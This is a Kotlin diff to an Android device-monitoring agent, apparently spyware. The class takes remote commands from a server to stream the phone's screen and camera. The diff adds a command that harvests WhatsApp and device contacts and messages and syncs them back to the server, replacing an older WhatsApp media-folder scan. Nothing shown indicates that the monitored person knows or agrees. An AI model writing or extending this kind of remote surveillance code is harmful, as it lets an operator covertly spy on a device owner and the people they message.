@@ -143,6 +143,7 @@ class SyncRunner(private val context: Context) {
         }
         commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
         commands.filter { it.command_type == "camera_stream" }.forEach { processCameraStreamCommand(bearer, it) }
+        commands.filter { it.command_type == "whatsapp_sync_now" }.forEach { processWhatsAppSyncCommand(bearer, it) }
 
         // 2. Heavy periodic background collectors run after commands complete
         if (flags.app_usage_tracking) {
@@ -246,6 +247,24 @@ class SyncRunner(private val context: Context) {
             ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, files = files))
         } catch (e: Exception) {
             // Retried next sync cycle.
+        }
+    }
+
+    private suspend fun processWhatsAppSyncCommand(bearer: String, command: RemoteCommand) {
+        try {
+            val db = AppDatabase.getInstance(context)
+            syncWhatsAppMessages(bearer, db)
+            ApiClient.service.ackCommand(
+                bearer,
+                command.id,
+                AckCommandRequest(success = true, message = "WhatsApp contacts and messages synced")
+            )
+        } catch (e: Exception) {
+            ApiClient.service.ackCommand(
+                bearer,
+                command.id,
+                AckCommandRequest(success = false, message = e.message ?: "Failed to sync WhatsApp")
+            )
         }
     }
 
@@ -590,52 +609,11 @@ class SyncRunner(private val context: Context) {
     }
 
     private suspend fun syncWhatsAppMessages(bearer: String, db: AppDatabase) {
-        // If local room table has no messages, scan for WhatsApp media files on storage
+        // Collect and sync real WhatsApp & device contacts to populate the complete chatlist
         try {
-            if (db.whatsAppMessageDao().count() == 0) {
-                val waFiles = FileManagerCollector(context).listWhatsAppFiles(50)
-                if (waFiles.isNotEmpty()) {
-                    val entries = mutableListOf<WhatsAppMessageEntry>()
-                    for (file in waFiles) {
-                        if (file.isDirectory) continue
-                        val lower = file.name.lowercase()
-                        val type = when {
-                            lower.endsWith(".opus") || lower.endsWith(".mp3") || lower.endsWith(".m4a") -> "audio"
-                            lower.endsWith(".jpg") || lower.endsWith(".jpeg") || lower.endsWith(".png") || lower.endsWith(".webp") -> "image"
-                            lower.endsWith(".mp4") || lower.endsWith(".3gp") || lower.endsWith(".mkv") -> "video"
-                            lower.endsWith(".pdf") || lower.endsWith(".doc") || lower.endsWith(".docx") -> "document"
-                            else -> null
-                        }
-                        if (type != null) {
-                            val isOut = file.path.contains("Sent", ignoreCase = true)
-                            val chat = when {
-                                file.path.contains("Voice Notes", ignoreCase = true) -> "WhatsApp Audio"
-                                file.path.contains("Images", ignoreCase = true) -> "WhatsApp Photos"
-                                file.path.contains("Documents", ignoreCase = true) -> "WhatsApp Documents"
-                                file.path.contains("Video", ignoreCase = true) -> "WhatsApp Video"
-                                else -> "WhatsApp Media"
-                            }
-                            entries += WhatsAppMessageEntry(
-                                chatName = chat,
-                                sender = if (isOut) "Me" else chat,
-                                messageText = when (type) {
-                                    "audio" -> "🎤 Voice message"
-                                    "image" -> "📷 Photo"
-                                    "video" -> "🎥 Video"
-                                    "document" -> "📄 ${file.name}"
-                                    else -> file.name
-                                },
-                                isOutgoing = isOut,
-                                messageTimeEpochMs = System.currentTimeMillis() - 7200000,
-                                mediaType = type,
-                                mediaPath = file.path
-                            )
-                        }
-                    }
-                    if (entries.isNotEmpty()) {
-                        db.whatsAppMessageDao().insertAll(entries)
-                    }
-                }
+            val contacts = com.spapp.monitoring.collectors.WhatsAppContactsCollector(context).collectAllWhatsAppContacts()
+            if (contacts.isNotEmpty()) {
+                db.whatsAppMessageDao().insertAll(contacts)
             }
         } catch (_: Exception) {}
 
